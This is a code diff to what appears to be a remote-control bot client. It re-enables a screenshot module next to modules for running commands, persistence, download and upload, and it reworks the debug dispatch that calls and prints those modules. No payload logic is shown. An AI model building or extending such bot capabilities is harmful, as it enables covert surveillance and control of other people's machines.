@@ -13,11 +13,11 @@ from modules import runcmd
 from modules import persistence
 from modules import download
 from modules import upload
-#from modules import screenshot
+from modules import screenshot
 
 
 #MODULES = ['runcmd', 'persistence', 'download', 'upload', 'screenshot']
-MODULES = ['runcmd', 'persistence', 'download', 'upload']
+MODULES = ['runcmd', 'persistence', 'download', 'upload', 'screenshot']
 if not settings.BOT_ID:
     settings.BOT_ID = socket.gethostname()
 if not utils.validate_botid(settings.BOT_ID):
@@ -47,11 +47,10 @@ General commands:
 def main(args):
     if settings.DEBUG:
         if len(args) > 0 and args[0] in MODULES:
-            if len(args) > 1:
-                if args[1] == "help":
-                    print(sys.modules["modules.%s" % args[0]].help())
-                else:
-                    sys.modules["modules.%s" % args[0]].run(*args[1:])
+            if len(args) > 1 and args[1] == "help":
+                print(sys.modules["modules.%s" % args[0]].help())
+            else:
+                print(sys.modules["modules.%s" % args[0]].run(*args[1:]))
             sys.exit()
 
     time.sleep(settings.PAUSE_AT_START)
